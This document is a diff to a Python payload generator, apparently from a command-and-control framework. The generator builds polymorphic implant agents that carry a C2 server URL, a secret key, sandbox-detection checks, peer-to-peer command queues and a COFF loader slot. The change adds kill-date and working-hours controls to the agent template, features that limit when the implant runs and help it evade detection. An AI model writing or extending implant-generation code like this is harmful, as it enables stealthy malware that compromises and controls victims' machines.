@@ -144,10 +144,19 @@ class PayloadGenerator:
             print(f"[ERROR] Failed to pre-register agent: {str(e)}")
             raise
 
+        # Extract kill_date and working_hours from profile_config
+        kill_date = profile_config.get('kill_date', '2025-12-31T23:59:59Z')
+        working_hours = profile_config.get('working_hours', {
+            "start_hour": 9,
+            "end_hour": 17,
+            "timezone": "UTC",
+            "days": [1, 2, 3, 4, 5]  # Monday to Friday
+        })
+
         print(f"[+] Generating polymorphic variant")
         if payload_type == "phantom_hawk_agent":
             return self._generate_phantom_hawk_agent(
-                agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox
+                agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, kill_date=kill_date, working_hours=working_hours
             )
         elif payload_type == "go_agent":
             return self._generate_go_agent(
@@ -156,7 +165,14 @@ class PayloadGenerator:
         else:
             raise ValueError(f"Unsupported payload type: {payload_type}")
 
-    def _generate_phantom_hawk_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False):
+    def _generate_phantom_hawk_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None):
+        if working_hours is None:
+            working_hours = {
+                "start_hour": 9,
+                "end_hour": 17,
+                "timezone": "UTC",
+                "days": [1, 2, 3, 4, 5]  # Monday to Friday
+            }
 
         poly = PolymorphicEngine()
 
@@ -215,6 +231,8 @@ class PayloadGenerator:
 
         m_encrypt_data = poly.generate_random_name('encrypt_data_')
         m_decrypt_data = poly.generate_random_name('decrypt_data_')
+        m_check_working_hours = poly.generate_random_name('check_working_hours_')
+        m_check_kill_date = poly.generate_random_name('check_kill_date_')
 
         v_c2 = poly.generate_random_name('c2_')
         v_agent_id = poly.generate_random_name('agent_id_')
@@ -246,6 +264,9 @@ class PayloadGenerator:
         v_p2p_command_queue = poly.generate_random_name('p2p_command_queue_')
 
         v_sandbox_enabled = poly.generate_random_name('sandbox_enabled_')
+
+        v_kill_date = poly.generate_random_name('kill_date_')
+        v_working_hours = poly.generate_random_name('working_hours_')
 
         v_coffloader_b64 = poly.generate_random_name('coffloader_b64_')
 
@@ -323,6 +344,8 @@ class PayloadGenerator:
             m_setup_p2p_communication=m_setup_p2p_communication,
             m_encrypt_data=m_encrypt_data,
             m_decrypt_data=m_decrypt_data,
+            m_check_working_hours=m_check_working_hours,
+            m_check_kill_date=m_check_kill_date,
             v_c2=v_c2,
             v_agent_id=v_agent_id,
             v_headers=v_headers,
@@ -358,6 +381,13 @@ class PayloadGenerator:
             v_p2p_discovery_timer=v_p2p_discovery_timer,
             v_p2p_command_queue=v_p2p_command_queue,
             v_sandbox_enabled=v_sandbox_enabled,
+            v_kill_date=v_kill_date,
+            v_working_hours=v_working_hours,
+            kill_date=kill_date,
+            working_hours_start_hour=working_hours.get('start_hour', 9),
+            working_hours_end_hour=working_hours.get('end_hour', 17),
+            working_hours_timezone=working_hours.get('timezone', 'UTC'),
+            working_hours_days=working_hours.get('days', [1, 2, 3, 4, 5]),  # Pass as actual list for template formatting
             v_coffloader_b64="",
             sandbox_check_enabled=not disable_sandbox,  # Set to False if sandbox is disabled
             dead_code_2=dead_code_2,
